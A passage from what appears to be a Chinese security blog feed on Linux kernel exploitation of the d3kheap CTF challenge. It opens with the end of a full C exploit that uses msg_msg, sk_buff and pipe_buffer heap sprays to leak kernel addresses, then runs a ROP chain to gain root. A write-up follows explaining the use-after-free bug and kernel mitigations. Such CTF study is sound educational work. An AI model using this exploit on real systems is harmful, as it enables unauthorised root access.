*)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] construct UAF\033[0m&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print_hex(oob_msg.mtext, sizeof(oob_msg.mtext));</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (kernel_addr - <span class="number">0xffffffff8203fe40</span>);</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> push_rsi_pop_rsp_pop_4reg_ret = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_cred;</span><br><span class="line">    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = getShell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220920223946797.png"                      alt="image-20220920223946797"                ></p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80" >https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80<i class="fas fa-external-link-alt"></i></a></p><p>题目在上一篇文章</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
  </entry>
  
  <entry>
    <title>kernel内存搜索技术</title>
    <link href="https://cv196082.gitee.io/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/"/>
    <id>https://cv196082.gitee.io/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/</id>
    <published>2022-09-16T14:36:11.000Z</published>
    <updated>2022-09-23T07:14:01.194Z</updated>
    
    <content type="html"><![CDATA[<p>这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3kheap_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2 &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1234</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_480);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">1024LL</span>);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = v2;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2 &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)a2 == <span class="number">0x4321</span> || (_DWORD)a2 == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      LABEL_13:</span><br><span class="line">    printk(&amp;unk_4F8);</span><br><span class="line">    LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();</span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  d3kheap_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先题目只有create和delete的功能，漏洞点在于ref_count的错误初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref_count dd <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后就是编译选项的readme文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><ol><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ol><p>所以总的来说题目只存在一个UAF漏洞，除此之外什么都没有了。</p><p>这里不过多的介绍setxattr函数，在前一篇文章有介绍，这里主要内容还是放在这一项技术的实现手法。</p><h2 id="setxattr多次劫持msg-msg实现泄漏"><a href="#setxattr多次劫持msg-msg实现泄漏" class="headerlink" title="setxattr多次劫持msg_msg实现泄漏"></a>setxattr多次劫持msg_msg实现泄漏</h2><h3 id="构造UAF"><a href="#构造UAF" class="headerlink" title="构造UAF"></a>构造UAF</h3><p>首先我们如果是要劫持msg_msg的堆块的话需要他是在free状态，所以我们需要构造出UAF，构造步骤为：</p><ol><li>add()出一个size为1024的堆块</li><li>del()删除刚刚的堆块</li><li>利用msgsnd生成一块1024大小的msg_msg结构体</li><li>最后利用del()删除掉msg_msg结构体所在的堆块</li></ol><p>之后这个堆块虽然对msg_msg来说是正在使用的状态，但是在slub看来是已经被free掉的了。</p><h3 id="msg-msg地址搜索原理"><a href="#msg-msg地址搜索原理" class="headerlink" title="msg_msg地址搜索原理"></a>msg_msg地址搜索原理</h3><p>当我们调用msgget时会创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="keyword">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span 